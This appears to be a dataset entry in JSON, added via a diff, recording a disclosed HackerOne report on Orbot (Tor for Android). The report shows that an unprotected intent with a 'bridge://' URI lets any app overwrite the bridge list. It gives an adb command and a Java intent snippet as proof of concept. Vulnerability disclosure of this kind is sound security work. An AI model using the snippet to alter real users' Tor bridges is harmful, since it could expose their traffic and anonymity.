@@ -1,0 +1,38 @@
+{
+    "reported_to": "Tor",
+    "reported_by": "bagipro ",
+    "title": "[Android org.torproject.android] Possible to force list of bridges",
+    "content": "\nDo the following thing from ADB to emulate the activity start:\nCode 103 Bytes\n1adb am start -n org.torproject.android/.OrbotMainActivity -a android.intent.action.VIEW -d bridge://xxx\nOr create a malware app with the following code:\nCode 246 Bytes\n1        Intent intent = new Intent(\"android.intent.action.VIEW\");\n2        intent.setClassName(\"org.torproject.android\", \"org.torproject.android.OrbotMainActivity\");\n3        intent.setData(Uri.parse(\"bridge://xxx\"));\n4        startActivity(intent);\nAnd new list of bridges will be applied (notification will be shown and new value will be added to shared_prefs).\nIt's dangerous because any not authorized app (third party app) installed on the same device will be able to modify settings. On the newest Android devices this not authozed change can be done remotely from any web-browser using Instant Apps (app that doesn't require install to execute any code).\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Forced Browsing"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1503357060,
+    "report_url": "https://hackerone.com/reports/252626",
+    "is_multi_component": true,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "MOBILE",
+    "steps": [
+        [
+            1,
+            "adb am start -n org.torproject.android/.OrbotMainActivity -a android.intent.action.VIEW -d bridge://xxx"
+        ],
+        [
+            2,
+            "Create a malware app with the provided intent code to modify the bridge settings."
+        ]
+    ],
+    "vuln_description": "The vulnerability allows any third-party app or even a remote attacker via Instant Apps to modify the list of bridges in Orbot (Tor for Android) without authorization. This is done by sending an intent with a specific URI scheme (bridge://) to the OrbotMainActivity, which then applies the new bridge list and stores it in shared_prefs.",
+    "reason": "The vulnerability involves understanding the intent-based communication mechanism in Android and the specific URI scheme that Orbot uses to accept bridge configurations. While the attack vector is straightforward once the URI scheme is known, discovering this requires knowledge of Android intents and the specific implementation details of Orbot.",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
